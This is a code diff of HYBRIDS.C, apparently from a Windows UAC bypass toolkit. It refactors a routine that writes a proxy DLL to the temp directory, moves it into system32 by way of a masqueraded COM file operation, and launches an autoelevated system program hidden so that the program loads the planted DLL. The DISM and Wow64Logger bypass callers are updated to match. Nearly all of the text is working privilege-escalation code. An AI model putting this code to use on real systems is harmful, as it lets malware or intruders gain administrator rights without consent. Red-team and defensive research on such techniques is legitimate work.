@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.63
+*  VERSION:     3.64
 *
-*  DATE:        11 Jan 2023
+*  DATE:        04 Feb 2023
 *
 *  Hybrid UAC bypass methods.
 *
@@ -27,45 +27,85 @@
 *
 * Post execution cleanup routine.
 *
-* lpItemName length limited to MAX_PATH
-*
 */
 BOOL ucmMethodCleanupSingleItemSystem32(
-    LPCWSTR lpItemName
+    _In_ LPCWSTR lpItemName,
+    _In_opt_ LPCWSTR lpSubDirectory
 )
 {
-    WCHAR szBuffer[MAX_PATH * 2];
+    LPWSTR lpDestination;
+    SIZE_T cb;
+    BOOL bResult = FALSE;
 
-    _strcpy(szBuffer, g_ctx->szSystemDirectory);
-    _strcat(szBuffer, lpItemName);
+    cb = 1 + sizeof(g_ctx->szSystemDirectory);
+    cb += _strlen(lpItemName);
+    if (lpSubDirectory) cb += _strlen(lpSubDirectory);
 
-    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
+    cb *= sizeof(WCHAR);
+
+    lpDestination = (LPWSTR)supHeapAlloc(cb);
+    if (lpDestination) {
+
+        _strcpy(lpDestination, g_ctx->szSystemDirectory);
+        if (lpSubDirectory)
+            _strcat(lpDestination, lpSubDirectory);
+
+        _strcat(lpDestination, lpItemName);
+
+        bResult = ucmMasqueradedDeleteDirectoryFileCOM(lpDestination);
+
+        supHeapFree(lpDestination);
+    }
+
+    return bResult;
 }
 
 /*
-* ucmxGenericAutoelevation
+* ucmxGenericAutoelevationEx
 *
 * Purpose:
 *
 * Bypass UAC by abusing target autoelevated system32 application via missing system32 dll
 *
 */
-NTSTATUS ucmxGenericAutoelevation(
+NTSTATUS ucmGenericAutoelevationEx(
     _In_opt_ LPCWSTR lpTargetApp,
     _In_ LPCWSTR lpTargetDll,
+    _In_opt_ LPCWSTR lpParameters,
+    _In_opt_ LPCWSTR lpSubDirectory,
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
-    WCHAR szDest[MAX_PATH * 2];
-    SIZE_T nSource, nLen;
-    LPWSTR lpSource;
+    SIZE_T cb, nLen;
+    LPWSTR lpSource, lpDestination;
 
-    nSource = sizeof(g_ctx->szTempDirectory) + (_strlen(lpTargetDll) * sizeof(WCHAR));
-    lpSource = (LPWSTR)supHeapAlloc(nSource);
+    //
+    // Allocate source path.
+    //
+    cb = (MAX_PATH * 2) +
+        sizeof(g_ctx->szTempDirectory) +
+        (_strlen(lpTargetDll) * sizeof(WCHAR));
+
+    lpSource = (LPWSTR)supHeapAlloc(cb + sizeof(UNICODE_NULL));
     if (lpSource == NULL)
         return STATUS_MEMORY_NOT_ALLOCATED;
+
+    //
+    // Allocate destination path.
+    //
+    cb = sizeof(g_ctx->szSystemDirectory);
+    if (lpSubDirectory)
+        cb += (_strlen(lpSubDirectory) * sizeof(WCHAR));
+
+    cb += (_strlen(lpTargetDll) * sizeof(WCHAR));
+
+    lpDestination = (LPWSTR)supHeapAlloc(cb + sizeof(UNICODE_NULL));
+    if (lpDestination == NULL) {
+        supHeapFree(lpSource);
+        return STATUS_MEMORY_NOT_ALLOCATED;
+    }
 
     //put target dll
     _strcpy(lpSource, g_ctx->szTempDirectory);
@@ -77,13 +117,14 @@ NTSTATUS ucmxGenericAutoelevation(
     if (supWriteBufferToFile(lpSource, ProxyDll, ProxyDllSize)) {
 
         //target dir
-        RtlSecureZeroMemory(szDest, sizeof(szDest));
-        _strcpy(szDest, g_ctx->szSystemDirectory);
+        _strcpy(lpDestination, g_ctx->szSystemDirectory);
+        if (lpSubDirectory)
+            _strcat(lpDestination, lpSubDirectory);
 
         //drop payload to system32
-        if (ucmMasqueradedMoveFileCOM(lpSource, szDest)) {
+        if (ucmMasqueradedMoveFileCOM(lpSource, lpDestination)) {
 
-            _strcpy(lpSource, szDest);
+            _strcpy(lpSource, lpDestination);
             _strcat(lpSource, lpTargetDll);
             nLen = _strlen(lpSource);
             lpSource[nLen - 1] = UCM_TRASH_END_CHAR;
@@ -92,11 +133,11 @@ NTSTATUS ucmxGenericAutoelevation(
 
                 //run target app
                 if (lpTargetApp) {
-                    if (supRunProcess2(lpTargetApp, 
-                        NULL, 
-                        NULL, 
-                        SW_HIDE, 
-                        SUPRUNPROCESS_TIMEOUT_DEFAULT)) 
+                    if (supRunProcess2(lpTargetApp,
+                        lpParameters,
+                        NULL,
+                        SW_HIDE,
+                        SUPRUNPROCESS_TIMEOUT_DEFAULT))
                     {
                         Sleep(5000);
                         MethodResult = STATUS_SUCCESS;
@@ -110,8 +151,33 @@ NTSTATUS ucmxGenericAutoelevation(
     }
 
     supHeapFree(lpSource);
+    supHeapFree(lpDestination);
 
     return MethodResult;
+}
+
+/*
+* ucmGenericAutoelevation
+*
+* Purpose:
+*
+* Bypass UAC by abusing target autoelevated system32 application via missing system32 dll
+*
+*/
+NTSTATUS ucmGenericAutoelevation(
+    _In_opt_ LPCWSTR lpTargetApp,
+    _In_ LPCWSTR lpTargetDll,
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    return ucmGenericAutoelevationEx(lpTargetApp,
+        lpTargetDll,
+        NULL,
+        NULL,
+        ProxyDll,
+        ProxyDllSize);
+
 }
 
 /*
@@ -382,7 +448,7 @@ VOID ucmDismMethodCleanup(VOID)
     cNames = (g_ctx->dwBuildNumber < NT_WIN10_20H1) ? 1 : DISM_DLL_NAMES;
 
     for (i = 0; i < cNames; i++) {
-        ucmMethodCleanupSingleItemSystem32(g_DismTargets[i]);
+        ucmMethodCleanupSingleItemSystem32(g_DismTargets[i], NULL);
     }
 }
 
@@ -415,7 +481,7 @@ NTSTATUS ucmDismMethod(
     
     for (i = 0; i < cNames; i++) {
 
-        MethodResult = ucmxGenericAutoelevation(NULL,
+        MethodResult = ucmGenericAutoelevation(NULL,
             g_DismTargets[i],
             ProxyDll,
             ProxyDllSize);
@@ -473,7 +539,7 @@ NTSTATUS ucmWow64LoggerMethod(
     // Remove file IMMEDIATELY after work.
     //
 
-    return ucmxGenericAutoelevation(szTarget,
+    return ucmGenericAutoelevation(szTarget,
         WOW64LOG_DLL,
         ProxyDll,
         ProxyDllSize);
